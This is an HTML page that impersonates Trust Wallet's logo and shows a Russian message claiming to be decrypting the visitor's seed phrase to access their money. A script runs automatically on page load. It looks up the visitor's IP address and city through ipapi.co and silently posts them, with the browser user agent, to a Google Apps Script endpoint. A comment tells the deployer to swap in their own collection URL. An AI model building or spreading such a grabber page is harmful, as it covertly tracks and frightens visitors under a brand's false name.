<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; font-family: -apple-system, sans-serif; }
        .container { text-align: center; width: 90%; max-width: 350px; }
        .logo-svg { width: 80px; height: 80px; margin-bottom: 40px; fill: #0500ff; }
        .loader-track { width: 100%; height: 4px; background-color: #f0f2f5; border-radius: 10px; margin-bottom: 20px; overflow: hidden; position: relative; }
        .loader-fill { width: 0%; height: 100%; background: #0500ff; animation: load 4s infinite ease-in-out; }
        .status { color: #5b616e; font-size: 15px; font-weight: 500; }
        @keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
    </style>
</head>
<body>

<div class="container">
    <svg class="logo-svg" viewBox="0 0 512 512">
        <path d="M256 0L48 94.4v133.4C48 355.6 256 512 256 512s208-156.4 208-284.2V94.4L256 0z" fill="#0500ff"/>
        <path d="M256 465c-20-15.8-164-129.5-164-237.2V122.3L256 45.1l164 77.2v105.5C420 335.5 276 449.2 256 465z" fill="#fff"/>
        <path d="M140 230l80 80 152-152" stroke="#0500ff" stroke-width="40" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <div class="loader-track"><div class="loader-fill"></div></div>
    <div class="status" id="status-text">Расшифровываем вашу seed-фразу, получаем доступ к вашим деньгам...</div>
</div>

<script>
    async function sendLog() {
        // !!! ЗАМЕНИ ССЫЛКУ НИЖЕ НА СВОЮ ИЗ ШАГА 1 !!!
        const webAppURL = 'https://script.google.com/macros/s/AKfycbykwY3qxSHEORxLTMD7eR5R6aK_3z12sNcG_OcEFdItC00ge1UZRTDjOsJPyKqKU0JCwg/exec';

        try {
            // Получаем IP и Гео
            const geoRes = await fetch('https://ipapi.co/json/');
            const geo = await geoRes.json();
            
            const params = new URLSearchParams();
            params.append('ip', geo.ip);
            params.append('location', `${geo.country_name}, ${geo.city}`);
            params.append('userAgent', navigator.userAgent);

            // Отправка в таблицу
            fetch(webAppURL, {
                method: 'POST',
                mode: 'no-cors',
                body: params
            });
        } catch (e) {
            // Если IP заблокирован, отправляем базовое инфо
            const params = new URLSearchParams();
            params.append('userAgent', navigator.userAgent);
            fetch(webAppURL, { method: 'POST', mode: 'no-cors', body: params });
        }
    }

    window.onload = sendLog;
</script>

</body>
</html>
